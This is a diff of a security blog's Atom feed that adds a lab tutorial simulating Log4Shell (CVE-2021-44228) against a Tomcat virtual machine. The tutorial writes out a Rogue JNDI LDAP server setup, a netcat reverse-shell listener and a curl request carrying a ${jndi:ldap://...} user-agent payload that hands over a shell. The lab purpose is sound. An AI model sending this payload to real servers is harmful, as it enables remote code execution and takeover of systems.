@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.9.1">Jekyll</generator>
   <link href="https://blog.openthreatresearch.com/tag/log4jshell/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://blog.openthreatresearch.com/" rel="alternate" type="text/html" />
-  <updated>2022-01-11T18:08:31-05:00</updated>
+  <updated>2022-01-12T01:20:57-05:00</updated>
   <id>https://blog.openthreatresearch.com/tag/log4jshell/feed.xml</id>
 
   
@@ -40,12 +40,149 @@
 
   
     <entry>
-      <title type="html">CVE-2021-44228 Log4jShell: Setting Up Virtual Machines for the Attacker and Victim</title>
-      <link href="https://blog.openthreatresearch.com/setting_up_attacker_victim_machines" rel="alternate" type="text/html" title="CVE-2021-44228 Log4jShell: Setting Up Virtual Machines for the Attacker and Victim" />
-      <published>2022-01-11T07:00:00-05:00</published>
-      <updated>2022-01-11T07:00:00-05:00</updated>
+      <title type="html">CVE-2021-44228: Exploiting Log4j Vulnerabilities using Rogue JNDI</title>
+      <link href="https://blog.openthreatresearch.com/simulating_cve_2021_44228" rel="alternate" type="text/html" title="CVE-2021-44228: Exploiting Log4j Vulnerabilities using Rogue JNDI" />
+      <published>2022-01-11T20:00:00-05:00</published>
+      <updated>2022-01-11T20:00:00-05:00</updated>
+      <id>https://blog.openthreatresearch.com/simulating_cve_2021_44228</id>
+      <content type="html" xml:base="https://blog.openthreatresearch.com/simulating_cve_2021_44228">&lt;p&gt;In this blog post, we will share the steps that you can follow to simulate the use of &lt;strong&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228&quot;&gt;CVE-2021-44228&lt;/a&gt;&lt;/strong&gt; to exploit &lt;strong&gt;Log4j&lt;/strong&gt; vulnerabilities using &lt;strong&gt;Rogue JNDI&lt;/strong&gt; (Malicious LDAP Server). We will follow the steps provided within the &lt;a href=&quot;https://github.com/Cyb3rWard0g/log4jshell-lab&quot;&gt;log4jshell-lab&lt;/a&gt; GitHub repository by &lt;a href=&quot;https://twitter.com/Cyb3rWard0g&quot;&gt;Roberto Rodriguez&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;pre-requisites&quot;&gt;Pre-Requisites&lt;/h1&gt;
+
+&lt;p&gt;For the purpose of this blog, we will assume that you have already deployed the required virtual machines using VirtualBox. You can review our previous blog posts to set up the virtual environment.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://blog.openthreatresearch.com/setting_up_attacker_victim_machines&quot;&gt;CVE-2021-44228: Setting Up Virtual Machines for the Attacker and Victim&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://blog.openthreatresearch.com/virtualbox_ubuntu_desktop&quot;&gt;VirtualBox: Creating an Ubuntu Desktop 20.04.3 LTS Virtual Machine&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://blog.openthreatresearch.com/virtualbox_ubuntu_server&quot;&gt;VirtualBox: Creating an Ubuntu Server 20.04.3 LTS Virtual Machine&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;tomcat-server-running-vulnerable-java-applications&quot;&gt;Tomcat Server Running Vulnerable Java Applications&lt;/h1&gt;
+
+&lt;p&gt;We have deployed our Tomcat Server using an Ubuntu server 20.04.3 LTS virtual machine. This server is running different Java applications that are vulnerable to an attacker using the Log4j CVE-2021-44228 remote code exeution vulnerability.&lt;/p&gt;
+
+&lt;p&gt;Let’s check the status of the tomcat service using the following commad:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;service tomcat status
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/blog/log4jshell_simulation/victim_checking_tomcat_service.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;setting-up-the-rogue-jndi-server&quot;&gt;Setting Up the Rogue JNDI Server&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Rogue JNDI&lt;/strong&gt; is a malicious &lt;strong&gt;LDAP server&lt;/strong&gt; that provides a malicious &lt;strong&gt;Java class&lt;/strong&gt; in response to the &lt;strong&gt;LDAP request&lt;/strong&gt; from our &lt;strong&gt;tomcat server&lt;/strong&gt; running a &lt;strong&gt;vulnerable version of Log4j&lt;/strong&gt;. The Java class may contain, for example, malicious code that can start a &lt;strong&gt;reverse shell connection&lt;/strong&gt; from our tomcat server. We will deploy a Rogue JNDI server in our attacker machine.&lt;/p&gt;
+
+&lt;p&gt;Using the &lt;strong&gt;cd&lt;/strong&gt; command, change your current directory to &lt;em&gt;log4jshell-lab/attacker/rogue-jndi/&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the &lt;strong&gt;docker build&lt;/strong&gt; command, build the docker image for the Rogue JNDI server&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo su
+
+cd log4jshell-lab/attacker/rogue-jndi/
+
+docker build . -t rogue-jndi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/blog/log4jshell_simulation/attacker_building_docker_image.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the &lt;strong&gt;docker run&lt;/strong&gt; command, start the Rogue JNDI server. Note that we are also defining the attacker IP address for the payload (192.168.50.4) and the ports that will be used by our server (1389 and 8888).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run --rm -ti -e PAYLOAD_IP=192.168.50.4 -p 1389:1389 -p 8888:8888 rogue-jndi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/blog/log4jshell_simulation/attacker_running_docker_image.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After starting the Rogue JNDI server, using a new &lt;strong&gt;terminal&lt;/strong&gt; window in the same attacker machine, we will use the &lt;strong&gt;nc&lt;/strong&gt; command to start a netcat listener to process the reverse shell connection.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo su
+
+nc -lvnp 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/blog/log4jshell_simulation/attacker_netcat_listener.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;AWESOME!! We have deployed our &lt;strong&gt;Rogue JNDI&lt;/strong&gt; LDAP server and our &lt;strong&gt;netcat&lt;/strong&gt; listener. You should have two &lt;strong&gt;terminal&lt;/strong&gt; windows like the ones showed in the image below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/blog/log4jshell_simulation/attacker_rogue_jndi_netcat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;exploiting-log4j-vulnerabilities&quot;&gt;Exploiting Log4j vulnerabilities&lt;/h1&gt;
+
+&lt;p&gt;When we were checking the availability of the Java applications in our Tomcat server, we needed to complete 2 steps:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Stablish a SSH connection to our Tomcat server using the user, IP address and password for our server.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Perform a &lt;strong&gt;GET&lt;/strong&gt; request using the API for each application.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;However, since the attacker does not have the credentials for our Tomcat server, it cannot stablish a SSH connection. If we perform the GET request using the API for our application to the Tomcat server, we can see that the appication is available, but we do not have control over the Tomcat server. Note that we are using the IP address for our Tomcat server and not the local IP 127.0.0.1 .&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -X GET 192.168.50.5:8080/Log4j-2.14.0-SNAPSHOT/api
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/blog/log4jshell_simulation/attacker_attempt_get_request.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We will now add a header to our GET request. The header of our request will contain a LDAP request that points to our Rogue JNDI server (192.168.50.4:1389)&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -X GET -H &apos;user-agent: ${jndi:ldap://192.168.50.4:1389/o=tomcat}&apos; 192.168.50.5:8080/Log4j-2.14.0-SNAPSHOT/api
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/blog/log4jshell_simulation/attacker_control_of_tomcat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see in the image above, after executing our GET request (With Header), we got a reverse shell connection from the Tomcat server to our attacker machine. We now have full control of the server!!&lt;/p&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;GitHub Repository&lt;/strong&gt;: &lt;a href=&quot;https://github.com/Cyb3rWard0g/log4jshell-lab&quot;&gt;https://github.com/Cyb3rWard0g/log4jshell-lab&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Research Notes&lt;/strong&gt;: &lt;a href=&quot;https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/research-notes&quot;&gt;https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/research-notes&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CVE-2021-44228 Simulation&lt;/strong&gt;: &lt;a href=&quot;https://github.com/Cyb3rWard0g/log4jshell-lab/blob/main/research-notes/2021-12-11_01-CVE-2021-44228-simulation.md&quot;&gt;https://github.com/Cyb3rWard0g/log4jshell-lab/blob/main/research-notes/2021-12-11_01-CVE-2021-44228-simulation.md&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Attacker System&lt;/strong&gt;: &lt;a href=&quot;https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/attacker&quot;&gt;https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/attacker&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Victim System&lt;/strong&gt;: &lt;a href=&quot;https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/victim&quot;&gt;https://github.com/Cyb3rWard0g/log4jshell-lab/tree/main/victim&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;YouTube video (Installing Rogue JNDI on Kali Linux)&lt;/strong&gt;: &lt;a href=&quot;https://youtu.be/F74Grm9PRYQ&quot;&gt;https://youtu.be/F74Grm9PRYQ&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Jose Rodriguez</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="Log4jShell" />
+      
+
+      
+        <summary type="html">In this blog post, we will share the steps that you can follow to simulate the use of CVE-2021-44228 to exploit Log4j vulnerabilities using Rogue JNDI (Malicious LDAP Server). We will follow the steps provided within the log4jshell-lab GitHub repository by Roberto Rodriguez</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">CVE-2021-44228: Setting Up Virtual Machines for the Attacker and Victim</title>
+      <link href="https://blog.openthreatresearch.com/setting_up_attacker_victim_machines" rel="alternate" type="text/html" title="CVE-2021-44228: Setting Up Virtual Machines for the Attacker and Victim" />
+      <published>2022-01-11T06:00:00-05:00</published>
+      <updated>2022-01-11T06:00:00-05:00</updated>
       <id>https://blog.openthreatresearch.com/setting_up_attacker_victim_machines</id>
-      <content type="html" xml:base="https://blog.openthreatresearch.com/setting_up_attacker_victim_machines">&lt;p&gt;In this blog post, we will share the steps that you can follow to set up the attacker and victim’s virtual machines in VirtualBox (Version 6.1.30) that you can use to simulate an attack that exploits &lt;strong&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228&quot;&gt;CVE-2021-44228&lt;/a&gt;&lt;/strong&gt;. We will follow the steps provided within the &lt;a href=&quot;https://github.com/Cyb3rWard0g/log4jshell-lab&quot;&gt;log4jshell-lab&lt;/a&gt; GitHub repository by &lt;a href=&quot;https://twitter.com/Cyb3rWard0g&quot;&gt;Roberto Rodriguez&lt;/a&gt;&lt;/p&gt;
+      <content type="html" xml:base="https://blog.openthreatresearch.com/setting_up_attacker_victim_machines">&lt;p&gt;In this blog post, we will share the steps that you can follow to set up the attacker and victim’s virtual machines in VirtualBox (Version 6.1.30) that you can use to simulate the use of &lt;strong&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228&quot;&gt;CVE-2021-44228&lt;/a&gt;&lt;/strong&gt; to exploit &lt;strong&gt;Log4j&lt;/strong&gt; vulnerabilities. We will follow the steps provided within the &lt;a href=&quot;https://github.com/Cyb3rWard0g/log4jshell-lab&quot;&gt;log4jshell-lab&lt;/a&gt; GitHub repository by &lt;a href=&quot;https://twitter.com/Cyb3rWard0g&quot;&gt;Roberto Rodriguez&lt;/a&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;pre-requisites&quot;&gt;Pre-Requisites&lt;/h1&gt;
 
@@ -327,7 +464,7 @@ sh Install-Sysmon-For-Linux.sh --config https://raw.githubusercontent.com/OTRF/B
       
 
       
-        <summary type="html">In this blog post, we will share the steps that you can follow to set up the attacker and victim’s virtual machines in VirtualBox (Version 6.1.30) that you can use to simulate an attack that exploits CVE-2021-44228. We will follow the steps provided within the log4jshell-lab GitHub repository by Roberto Rodriguez</summary>
+        <summary type="html">In this blog post, we will share the steps that you can follow to set up the attacker and victim’s virtual machines in VirtualBox (Version 6.1.30) that you can use to simulate the use of CVE-2021-44228 to exploit Log4j vulnerabilities. We will follow the steps provided within the log4jshell-lab GitHub repository by Roberto Rodriguez</summary>
       
 
       
